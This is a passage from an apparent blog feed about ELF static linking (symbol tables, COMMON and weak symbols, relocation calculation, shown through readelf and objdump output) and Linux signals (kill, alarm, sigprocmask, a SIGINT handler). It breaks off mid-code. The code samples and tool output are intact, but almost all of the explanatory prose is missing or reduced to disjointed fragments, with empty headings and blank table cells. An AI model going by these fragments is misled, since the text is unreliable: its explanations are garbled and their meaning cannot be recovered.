Symbol size */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>    st_info;<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>    st_other;<span class="comment">/* Symbol visibility */</span></span><br><span class="line">    Elf32_Section    st_shndx;<span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure><p><strong>st_name</strong></p><p>.strtab </p><p><strong>st_shndx</strong></p><ul><li><ul><li></li></ul></li><li><ul><li>SHN_ABS </li><li>SHN_COMMON COMMON</li><li>SHN_UNDEF </li></ul></li></ul><p><strong>st_info</strong></p><p></p><p></p><ul><li>STB_LOCAL</li><li>STB_GLOBAL</li><li>STB_WEAK</li></ul><p></p><ul><li>STT_NOTYPE </li><li>STT_OBJECT </li><li>STT_FUNC  </li><li>STT_SECTION </li><li>STT_FILE st_shndxSHN_ABS</li></ul><p><strong>st_size</strong></p><p>a.omainmain0x39&#x3D;57,int shared4</p><p><strong>st_value</strong></p><ul><li><ul><li>common</li><li>common</li></ul></li><li><ul><li></li></ul></li></ul><p><strong>st_other</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; readelf -s a.o b.o ab</span><br><span class="line"></span><br><span class="line">File: a.o</span><br><span class="line"></span><br><span class="line">Symbol table &#x27;.symtab&#x27; contains 11 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     1: 00000000     0 FILE    LOCAL  DEFAULT  ABS a.c</span><br><span class="line">     2: 00000000     0 SECTION LOCAL  DEFAULT    1</span><br><span class="line">     3: 00000000     0 SECTION LOCAL  DEFAULT    3</span><br><span class="line">     4: 00000000     0 SECTION LOCAL  DEFAULT    4</span><br><span class="line">     5: 00000000     0 SECTION LOCAL  DEFAULT    6</span><br><span class="line">     6: 00000000     0 SECTION LOCAL  DEFAULT    7</span><br><span class="line">     7: 00000000     0 SECTION LOCAL  DEFAULT    5</span><br><span class="line">     8: 00000000    57 FUNC    GLOBAL DEFAULT    1 main</span><br><span class="line">     9: 00000000     0 NOTYPE  GLOBAL DEFAULT  UND shared</span><br><span class="line">    10: 00000000     0 NOTYPE  GLOBAL DEFAULT  UND swap</span><br><span class="line"></span><br><span class="line">File: b.o</span><br><span class="line"></span><br><span class="line">Symbol table &#x27;.symtab&#x27; contains 10 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     1: 00000000     0 FILE    LOCAL  DEFAULT  ABS b.c</span><br><span class="line">     2: 00000000     0 SECTION LOCAL  DEFAULT    1</span><br><span class="line">     3: 00000000     0 SECTION LOCAL  DEFAULT    2</span><br><span class="line">     4: 00000000     0 SECTION LOCAL  DEFAULT    3</span><br><span class="line">     5: 00000000     0 SECTION LOCAL  DEFAULT    5</span><br><span class="line">     6: 00000000     0 SECTION LOCAL  DEFAULT    6</span><br><span class="line">     7: 00000000     0 SECTION LOCAL  DEFAULT    4</span><br><span class="line">     8: 00000000     4 OBJECT  GLOBAL DEFAULT    2 shared</span><br><span class="line">     9: 00000000    57 FUNC    GLOBAL DEFAULT    1 swap</span><br><span class="line"></span><br><span class="line">File: ab</span><br><span class="line"></span><br><span class="line">Symbol table &#x27;.symtab&#x27; contains 13 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     1: 08048094     0 SECTION LOCAL  DEFAULT    1</span><br><span class="line">     2: 08048108     0 SECTION LOCAL  DEFAULT    2</span><br><span class="line">     3: 0804916c     0 SECTION LOCAL  DEFAULT    3</span><br><span class="line">     4: 00000000     0 SECTION LOCAL  DEFAULT    4</span><br><span class="line">     5: 00000000     0 FILE    LOCAL  DEFAULT  ABS a.c</span><br><span class="line">     6: 00000000     0 FILE    LOCAL  DEFAULT  ABS b.c</span><br><span class="line">     7: 080480cd    57 FUNC    GLOBAL DEFAULT    1 swap</span><br><span class="line">     8: 0804916c     4 OBJECT  GLOBAL DEFAULT    3 shared</span><br><span class="line">     9: 08049170     0 NOTYPE  GLOBAL DEFAULT    3 __bss_start</span><br><span class="line">    10: 08048094    57 FUNC    GLOBAL DEFAULT    1 main</span><br><span class="line">    11: 08049170     0 NOTYPE  GLOBAL DEFAULT    3 _edata</span><br><span class="line">    12: 08049170     0 NOTYPE  GLOBAL DEFAULT    3 _end</span><br></pre></td></tr></table></figure><p>?</p><p>STT_SECTIONst_shndx</p><p>readelfobjdump</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; objdump -t a.o</span><br><span class="line"></span><br><span class="line">a.o:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">SYMBOL TABLE:</span><br><span class="line"><span class="number">00000000</span> l    df *ABS*  <span class="number">00000000</span> a.c</span><br><span class="line"><span class="number">00000000</span> l    d  .text  <span class="number">00000000</span> .text</span><br><span class="line"><span class="number">00000000</span> l    d  .data  <span class="number">00000000</span> .data</span><br><span class="line"><span class="number">00000000</span> l    d  .bss   <span class="number">00000000</span> .bss</span><br><span class="line"><span class="number">00000000</span> l    d  .note.GNU-<span class="built_in">stack</span>        <span class="number">00000000</span> .note.GNU-<span class="built_in">stack</span></span><br><span class="line"><span class="number">00000000</span> l    d  .eh_frame      <span class="number">00000000</span> .eh_frame</span><br><span class="line"><span class="number">00000000</span> l    d  .comment       <span class="number">00000000</span> .comment</span><br><span class="line"><span class="number">00000000</span> g     F .text  <span class="number">00000039</span> main</span><br><span class="line"><span class="number">00000000</span>         *UND*  <span class="number">00000000</span> shared</span><br><span class="line"><span class="number">00000000</span>         *UND*  <span class="number">00000000</span> swap</span><br></pre></td></tr></table></figure><h5 id="common-amp-amp--amp-amp-"><a href="#common-amp-amp--amp-amp-" class="headerlink" title="common&amp;&amp;&amp;&amp;"></a>common&amp;&amp;&amp;&amp;</h5><p>simple section.c</p><p>.bss(0bss)global_uninit_varCOM</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Num:    Value  Size Type    Bind   Vis      Ndx Name  </span><br><span class="line"><span class="number">14</span>: <span class="number">00000004</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT  COM global_uninit_var</span><br></pre></td></tr></table></figure><p>gccCOMMON gcc5 -fno-common__attribute__((nocommon))</p><p>gcc11commonbss</p><p></p><ul><li></li><li></li><li></li></ul><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">test.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">p1</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">double</span> d = <span class="number">666666</span>;</span><br><span class="line"><span class="type">int</span> p= <span class="number">200</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    p1();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,&amp;d);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%f,%d&quot;</span>,d,p);</span><br><span class="line">&#125;</span><br><span class="line">p1.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> d;</span><br><span class="line"><span class="type">void</span> <span class="title function_">p1</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,&amp;d);</span><br><span class="line">    d =<span class="number">0xffffffff</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(gcc11multiple definition of dcommon-fcommon,)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/NEMU&gt; gcc -m32  test.c p1.c</span><br><span class="line">grxer@Ubuntu16 /m/h/S/NEMU&gt; ./a.out</span><br><span class="line"><span class="number">0x804a020</span></span><br><span class="line"><span class="number">0x804a020</span></span><br><span class="line"><span class="number">666666.500000</span>,<span class="number">200</span></span><br></pre></td></tr></table></figure><p>ldwarning</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">test.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">p1</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> d = <span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> p= <span class="number">200</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    p1();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,&amp;d);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x,%x&quot;</span>,d,p);</span><br><span class="line">&#125;</span><br><span class="line">p1.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">double</span> d;</span><br><span class="line"><span class="type">void</span> <span class="title function_">p1</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,&amp;d);</span><br><span class="line">    d =<span class="number">1.0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/NEMU&gt; gcc -m32  test.c p1.c</span><br><span class="line">/usr/bin/ld: Warning: alignment <span class="number">4</span> of symbol `d<span class="number">&#x27;</span> in /tmp/ccEf1boS.o is smaller than <span class="number">8</span> in /tmp/cc2ZKeXO.o</span><br><span class="line">grxer@Ubuntu16 /m/h/S/NEMU&gt; ./a.out</span><br><span class="line"><span class="number">0x804a01c</span></span><br><span class="line"><span class="number">0x804a01c</span></span><br><span class="line"><span class="number">0</span>,<span class="number">3f</span>f00000</span><br></pre></td></tr></table></figure><p>gcc__attribute__((weak))</p><p><em>_attribute</em>_((weak)) double dwarning</p><p><strong>dp</strong></p><p><strong>p1.cdouble dddouble</strong></p><p><strong>dtest.cint ddoublecodeint </strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">08048460 &lt;p1&gt;:</span><br><span class="line">8048460:       55                      push   %ebp</span><br><span class="line">8048461:       89 e5                   mov    %esp,%ebp</span><br><span class="line">8048463:       83 ec 08                sub    $0x8,%esp</span><br><span class="line">8048466:       83 ec 08                sub    $0x8,%esp</span><br><span class="line">8048469:       68 1c a0 04 08          push   $0x804a01c</span><br><span class="line">804846e:       68 1a 85 04 08          push   $0x804851a</span><br><span class="line">8048473:       e8 68 fe ff ff          call   80482e0 &lt;printf@plt&gt;</span><br><span class="line">8048478:       83 c4 10                add    $0x10,%esp</span><br><span class="line">804847b:       d9 e8                   fld1</span><br><span class="line">804847d:       dd 1d 1c a0 04 08       fstpl  0x804a01c</span><br><span class="line">8048483:       90                      nop</span><br><span class="line">8048484:       c9                      leave</span><br><span class="line">8048485:       c3                      ret</span><br></pre></td></tr></table></figure><p>fld11x87st0fstpl&amp;d</p><p>double1 3FF0000000000000</p><p><img src="/2023/04/28/static-link/image-20230429234155494.png" alt="image-20230429234155494"></p><p>bugqextern</p><p> <em>_attribute</em>_ (weakref)</p><p>0</p><p></p><p>c++c++,c++filt</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/NEMU&gt; c++filt _ZN3foo3barE</span><br><span class="line">foo::bar</span><br></pre></td></tr></table></figure><p>cextern c int x; extern c { intx ;inty} </p><p>cc++c++,#ifdef</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> c &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">memset</span><span class="params">(<span class="type">void</span> *,<span class="type">int</span>,<span class="type">size_t</span>)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p></p><p><strong></strong></p><p>linker</p><p><strong></strong></p><p>E U D</p><ul><li>E </li><li>U </li><li>D </li></ul><p></p><p> DU</p><p>UUDE</p><p>UE</p><p></p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>a.c shareswap</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter4&gt; objdump -dS a.o</span><br><span class="line"></span><br><span class="line">a.o:     file format elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000 &lt;main&gt;:</span><br><span class="line">extern int shared;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">   0:   8d 4c 24 04             lea    0x4(%esp),%ecx</span><br><span class="line">   4:   83 e4 f0                and    $0xfffffff0,%esp</span><br><span class="line">   7:   ff 71 fc                pushl  -0x4(%ecx)</span><br><span class="line">   a:   55                      push   %ebp</span><br><span class="line">   b:   89 e5                   mov    %esp,%ebp</span><br><span class="line">   d:   51                      push   %ecx</span><br><span class="line">   e:   83 ec 14                sub    $0x14,%esp</span><br><span class="line">    int a = 6;</span><br><span class="line">  11:   c7 45 f4 06 00 00 00    movl   $0x6,-0xc(%ebp)</span><br><span class="line">    swap(&amp;a, &amp;shared);</span><br><span class="line">  18:   83 ec 08                sub    $0x8,%esp</span><br><span class="line">  1b:   68 00 00 00 00          push   $0x0</span><br><span class="line">  20:   8d 45 f4                lea    -0xc(%ebp),%eax</span><br><span class="line">  23:   50                      push   %eax</span><br><span class="line">  24:   e8 fc ff ff ff          call   25 &lt;main+0x25&gt;</span><br><span class="line">  29:   83 c4 10                add    $0x10,%esp</span><br><span class="line">  2c:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">&#125;</span><br><span class="line">  31:   8b 4d fc                mov    -0x4(%ebp),%ecx</span><br><span class="line">  34:   c9                      leave</span><br><span class="line">  35:   8d 61 fc                lea    -0x4(%ecx),%esp</span><br><span class="line">  38:   c3                      ret</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1b:   68 00 00 00 00          push   $0x0 ;shared</span><br><span class="line">24:   e8 fc ff ff ff          call   25 &lt;main+0x25&gt;;swap</span><br></pre></td></tr></table></figure><p></p><p>.rel.xxx</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset;<span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word    r_info;<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure><p><strong>r_offset</strong>linker</p><p>r_info 824</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter4&gt; readelf -r a.o</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rel.text&#x27;</span> at offset <span class="number">0x1b0</span> contains <span class="number">2</span> entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line"><span class="number">0000001</span>c  <span class="number">00000901</span> R_386_32          <span class="number">00000000</span>   shared</span><br><span class="line"><span class="number">00000025</span>  <span class="number">00000</span>a02 R_386_PC32        <span class="number">00000000</span>   swap</span><br></pre></td></tr></table></figure><p>Info24 9a</p><p><strong>readelfSym. Name</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line"><span class="number">9</span>:  <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND shared</span><br><span class="line"><span class="number">10</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND swap</span><br></pre></td></tr></table></figure><p>offset 1c25</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1b</span>:   <span class="number">68</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          push   $<span class="number">0x0</span> ;shared</span><br><span class="line"><span class="number">24</span>:   e8 fc ff ff ff          call   <span class="number">25</span> &lt;main+<span class="number">0x25</span>&gt;;swap</span><br></pre></td></tr></table></figure><p> <a href="https://bbs.kanxue.com/thread-246373.htm">https://bbs.kanxue.com/thread-246373.htm</a></p><p></p><p>R_386_32 </p><p>R_386_PC32 </p><p>SA()</p><p>S+Aoffset </p><p> P S+A-P</p><p>main</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">08048094</span> &lt;main&gt;:</span><br><span class="line"> <span class="number">8048094</span>:       <span class="number">8</span>d <span class="number">4</span>c <span class="number">24</span> <span class="number">04</span>             lea    <span class="number">0x4</span>(%esp),%ecx</span><br><span class="line"> <span class="number">8048098</span>:       <span class="number">83</span> e4 f0                and    $<span class="number">0xfffffff0</span>,%esp</span><br><span class="line"> <span class="number">804809b</span>:       ff <span class="number">71</span> fc                pushl  <span class="number">-0x4</span>(%ecx)</span><br><span class="line"> <span class="number">804809</span>e:       <span class="number">55</span>                      push   %ebp</span><br><span class="line"> <span class="number">804809f</span>:       <span class="number">89</span> e5                   mov    %esp,%ebp</span><br><span class="line"> <span class="number">80480</span>a1:       <span class="number">51</span>                      push   %ecx</span><br><span class="line"> <span class="number">80480</span>a2:       <span class="number">83</span> ec <span class="number">14</span>                sub    $<span class="number">0x14</span>,%esp</span><br><span class="line"> <span class="number">80480</span>a5:       c7 <span class="number">45</span> f4 <span class="number">06</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   $<span class="number">0x6</span>,<span class="number">-0xc</span>(%ebp)</span><br><span class="line"> <span class="number">80480</span>ac:       <span class="number">83</span> ec <span class="number">08</span>                sub    $<span class="number">0x8</span>,%esp</span><br><span class="line"> <span class="number">80480</span>af:       <span class="number">68</span> <span class="number">6</span>c <span class="number">91</span> <span class="number">04</span> <span class="number">08</span>          push   $<span class="number">0x804916c</span></span><br><span class="line"> <span class="number">80480b</span>4:       <span class="number">8</span>d <span class="number">45</span> f4                lea    <span class="number">-0xc</span>(%ebp),%eax</span><br><span class="line"> <span class="number">80480b</span>7:       <span class="number">50</span>                      push   %eax</span><br><span class="line"> <span class="number">80480b</span>8:       e8 <span class="number">10</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          call   <span class="number">80480</span>cd &lt;swap&gt;</span><br><span class="line"> <span class="number">80480b</span>d:       <span class="number">83</span> c4 <span class="number">10</span>                add    $<span class="number">0x10</span>,%esp</span><br><span class="line"> <span class="number">80480</span>c0:       b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov    $<span class="number">0x0</span>,%eax</span><br><span class="line"> <span class="number">80480</span>c5:       <span class="number">8b</span> <span class="number">4</span>d fc                mov    <span class="number">-0x4</span>(%ebp),%ecx</span><br><span class="line"> <span class="number">80480</span>c8:       c9                      leave</span><br><span class="line"> <span class="number">80480</span>c9:       <span class="number">8</span>d <span class="number">61</span> fc                lea    <span class="number">-0x4</span>(%ecx),%esp</span><br><span class="line"> <span class="number">80480</span>cc:       c3                      ret</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">     </span><br><span class="line">     7: 080480cd    57 FUNC    GLOBAL DEFAULT    1 swap</span><br><span class="line">     8: 0804916c     4 OBJECT  GLOBAL DEFAULT    3 shared</span><br><span class="line">     </span><br><span class="line">80480af:       68 6c 91 04 08          push   $0x804916c;shared</span><br><span class="line">80480b8:       e8 10 00 00 00          call   80480cd &lt;swap&gt;;swap</span><br></pre></td></tr></table></figure><p>6c 91 04 08 0x804916c shared</p><p>10 00 00 00 0x00000010 0x80480b8+0x5+0x10&#x3D;0x80480CD</p><blockquote><p>-4fffffffc(-4)</p><p></p><p>eip</p><p>S+A-Ps-(p+4)p+4qil</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ELF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux (Signal)</title>
      <link href="/2023/04/24/linux-signal/"/>
      <url>/2023/04/24/linux-signal/</url>
      
        <content type="html"><![CDATA[<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>(Fault)</p><ul><li><p></p></li><li><p>0linux</p></li></ul><p>linuxkill -l1 ~ 31UNIX()32 ~ 63()</p><table><thead><tr><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>1</td><td><code>SIGHUP</code></td><td></td><td></td></tr><tr><td>2</td><td><code>SIGINT</code></td><td>Ctrl+C</td><td></td></tr><tr><td>3</td><td><code>SIGQUIT</code></td><td>Ctrl+\</td><td>core</td></tr><tr><td>4</td><td><code>SIGILL</code></td><td></td><td>core</td></tr><tr><td>5</td><td><code>SIGTRAP</code></td><td></td><td>core</td></tr><tr><td>6</td><td><code>SIGABRT</code></td><td></td><td>core</td></tr><tr><td>7</td><td><code>SIGBUS</code></td><td></td><td>core</td></tr><tr><td>8</td><td><code>SIGFPE</code></td><td></td><td>core</td></tr><tr><td>9</td><td><code>SIGKILL</code></td><td></td><td></td></tr><tr><td>10</td><td><code>SIGUSR1</code></td><td>1</td><td></td></tr><tr><td>11</td><td><code>SIGSEGV</code></td><td></td><td>core</td></tr><tr><td>12</td><td><code>SIGUSR2</code></td><td>2</td><td></td></tr><tr><td>13</td><td><code>SIGPIPE</code></td><td></td><td></td></tr><tr><td>14</td><td><code>SIGALRM</code></td><td></td><td></td></tr><tr><td>15</td><td><code>SIGTERM</code></td><td></td><td></td></tr><tr><td>16</td><td><code>SIGSTKFLT</code></td><td></td><td>core</td></tr><tr><td>17</td><td><code>SIGCHLD</code></td><td></td><td></td></tr><tr><td>18</td><td><code>SIGCONT</code></td><td></td><td></td></tr><tr><td>19</td><td><code>SIGSTOP</code></td><td></td><td></td></tr><tr><td>20</td><td><code>SIGTSTP</code></td><td>Ctrl+Z</td><td></td></tr><tr><td>21</td><td><code>SIGTTIN</code></td><td></td><td></td></tr><tr><td>22</td><td><code>SIGTTOU</code></td><td></td><td></td></tr><tr><td>23</td><td><code>SIGURG</code></td><td></td><td></td></tr><tr><td>24</td><td><code>SIGXCPU</code></td><td>CPU</td><td>core</td></tr><tr><td>25</td><td><code>SIGXFSZ</code></td><td></td><td>core</td></tr><tr><td>26</td><td><code>SIGVTALRM</code></td><td></td><td></td></tr><tr><td>27</td><td><code>SIGPROF</code></td><td></td><td></td></tr><tr><td>28</td><td><code>SIGWINCH</code></td><td></td><td></td></tr><tr><td>29</td><td><code>SIGIO</code></td><td>I&#x2F;O</td><td></td></tr><tr><td>30</td><td>SIGPWR</td><td></td><td></td></tr><tr><td>31</td><td>SIGSYS</td><td></td><td></td></tr></tbody></table><p></p><p>linux 1 ~ 31()UNIXbitflag11</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ol><li><p></p></li><li><p>&#x2F;bin&#x2F;kill</p></li></ol><blockquote><p>&#x2F;bin&#x2F;kill -signalid pid</p><p>pidpid signalid</p><p>pidpid<strong></strong>signalid</p></blockquote><ol start="3"><li> ctrl c ctrl z</li><li>kill</li></ol><blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">kill</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">int</span> sig)</span>;</span><br><span class="line"><span class="number">0</span> <span class="number">-1</span>;</span><br><span class="line">pid &gt;<span class="number">0</span> sigpid;</span><br><span class="line">pid =<span class="number">0</span> sig();</span><br><span class="line">pid &lt;<span class="number">0</span> sig|pid|</span><br></pre></td></tr></table></figure></blockquote><ol start="5"><li>alarm</li></ol><blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">alarm</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> secs)</span>;</span><br><span class="line">secs    SIGALRM secs<span class="number">0</span>(pending)<span class="number">0</span></span><br></pre></td></tr></table></figure></blockquote><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p></p><blockquote><p></p></blockquote><p></p><blockquote><p> sigprocmask <strong>SIGKILL  SIGSTOP </strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sigprocmask</span><span class="params">(<span class="type">int</span> how, <span class="type">const</span> <span class="type">sigset_t</span> *<span class="built_in">set</span>, <span class="type">sigset_t</span> *oldset)</span>;</span><br><span class="line">how </span><br><span class="line">SIG_BLOCK:<span class="built_in">set</span>blocked</span><br><span class="line">SIG_UNBLOCK:blocked<span class="built_in">set</span></span><br><span class="line">SIG_SETMASK:block=<span class="built_in">set</span></span><br><span class="line">blockedoldset</span><br><span class="line"><span class="built_in">set</span> <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> sigemptyset(<span class="type">sigset_t</span> *<span class="built_in">set</span>);</span><br><span class="line"><span class="built_in">set</span><span class="number">0</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sigfillset</span><span class="params">(<span class="type">sigset_t</span> *<span class="built_in">set</span>)</span>;</span><br><span class="line"><span class="built_in">set</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sigaddset</span><span class="params">(<span class="type">sigset_t</span> *<span class="built_in">set</span>, <span class="type">int</span> signum)</span>;</span><br><span class="line">signum</span><br><span class="line"><span class="type">int</span> <span class="title function_">sigdelset</span><span class="params">(<span class="type">sigset_t</span> *<span class="built_in">set</span>, <span class="type">int</span> signum)</span>;</span><br><span class="line">signum</span><br><span class="line"> o, <span class="number">-1</span> </span><br><span class="line"><span class="type">int</span> <span class="title function_">sigismember</span><span class="params">(<span class="type">const</span> <span class="type">sigset_t</span> *<span class="built_in">set</span>, <span class="type">int</span> signum)</span>;</span><br><span class="line"> signum  <span class="built_in">set</span>  <span class="number">1</span>,  <span class="number">0</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure></blockquote><p></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>IGSTOPSIGKILL</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*<span class="type">sighandler_t</span>)</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">sighandler_t</span> <span class="title function_">signal</span><span class="params">(<span class="type">int</span> signum, <span class="type">sighandler_t</span> handler)</span>;</span><br><span class="line">SIG_ERRCerrno);</span><br><span class="line">handler SIG_IGN signum;</span><br><span class="line">handler SIG_DFL signum;</span><br><span class="line">handler  </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">signal_handler</span><span class="params">(<span class="type">int</span> sig)</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ctrl c&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">__sighandler_t</span> rs = signal(SIGINT, signal_handler);</span><br><span class="line">    assert(rs != SIG_ERR);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; gcc -g -O2 -o test test.c</span><br><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line">^Cctrl c</span><br><span class="line">^Cctrl c</span><br><span class="line">^Cctrl c</span><br><span class="line">^Cctrl c</span><br><span class="line">^Cctrl c</span><br></pre></td></tr></table></figure><p></p><p>SIGINT</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">signal_handler</span><span class="params">(<span class="type">int</span> sig)</span> 